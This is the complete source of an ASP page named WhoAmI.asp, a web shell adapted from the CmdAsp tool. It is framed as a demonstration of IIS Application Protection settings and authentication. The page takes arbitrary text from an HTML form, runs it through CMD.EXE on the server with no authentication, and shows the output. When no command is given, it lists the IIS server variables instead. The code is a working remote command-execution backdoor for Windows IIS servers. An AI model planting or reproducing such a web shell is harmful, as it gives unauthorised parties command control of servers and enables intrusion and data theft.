<%@ Language=VBScript %>
<% 
'***************************************************************************************
'    Name: WhoAmI.asp
' Version: 2.0
'  Author: Maceo <maceo [at] dogmile.com>
'          Here is the original, from which this was adapted:
'          http://www.securiteam.com/tools/CmdAsp_asp_checks_your_last_line_of_defense.html
' Updated: 18.Aug.2007
'   Notes: Please create a C:\Temp folder and grant Modify to the Everyone group.
' Purpose: Demonstrates IIS Application Protection settings and authentication.
'   Legal: Public Domain.  Modify and redistribute freely.  No rights reserved.
'          No warranties, guarantees, technical support or indemnification provided.
'          Use at your own risk and only with prior written permission from management.
'***************************************************************************************
On Error Resume Next

Set oFileSystem = Server.CreateObject("Scripting.FileSystemObject")
Set oWshShell = Server.CreateObject("WScript.Shell")
Set oWshShellNet = Server.CreateObject("WScript.Network")

sTheCommand = Request.Form("RunTextBox") 'This is the input from the HTML form.
sUserAccount = oWshShellNet.UserName
sPageURL = Request.ServerVariables("URL")
sTempFile = "C:\Temp\" & oFileSystem.GetTempName()


If (sTheCommand <> "") Then
    oWshShell.Run "CMD.EXE /C " & sTheCommand & " > " & sTempFile, 0, True

    If Err.Number = 0 Then
        Set oFile = oFileSystem.OpenTextFile(sTempFile, 1, False, 0)
        sCommandOutput = Server.HTMLEncode(oFile.ReadAll)
        If Err.Number <> 0 Then sCommandOutput = "The Everyone group does not have the Modify permission on the C:\Temp folder, <BR>or that folder doesn't exist (manually create it now),<BR>or there was a syntax error in the command entered, <BR>or the specified executable is not available." & vbCr
        oFile.Close
        Set oFile = Nothing
        oFileSystem.DeleteFile sTempFile, True
    Else
        sCommandOutput = sUserAccount & " does not have the Execute permission on CMD.EXE!" & vbCrLf
    End If
    sCommandOutput = "<FONT Color='darkblue'><PRE>" & sCommandOutput & "</PRE></FONT>"
Else 
    sCommandOutput = "<P><H3><u>IIS Server ASP Variables:</u></H3><p><FONT Color='darkred'>"
    For Each sItem In Request.Servervariables
        If (InStr(sItem,"ALL_") = 0) And (InStr(sItem,"PASSWORD") = 0) Then
            sCommandOutput = sCommandOutput & "<b>" & sItem & ": </b><FONT Color='darkblue'>" & Request.ServerVariables(sItem) & "</FONT><p>"
        End If
    Next
    sCommandOutput = sCommandOutput & "</FONT><p>[<a href=""http://www.w3schools.com/asp/coll_servervariables.asp"">What do these variables mean?</a>]"

End If

Set oFileSystem = Nothing
Set oWshShell = Nothing
Set oWshShellNet = Nothing
%>




<HTML>
<HEAD><TITLE>Who Am I?</TITLE></HEAD>
<BODY>
<h3>User authenticated as:<FONT COLOR='darkred'>  <%= sUserAccount %> </FONT></h3>

<FORM Action="<%=sPageURL%>" METHOD="POST">
    <INPUT TYPE=Text NAME="RunTextBox" SIZE=35 VALUE="<%=sTheCommand%>">
    <INPUT TYPE=Submit VALUE="Execute">
</FORM>

<%=sCommandOutput%>

</BODY>
</HTML>

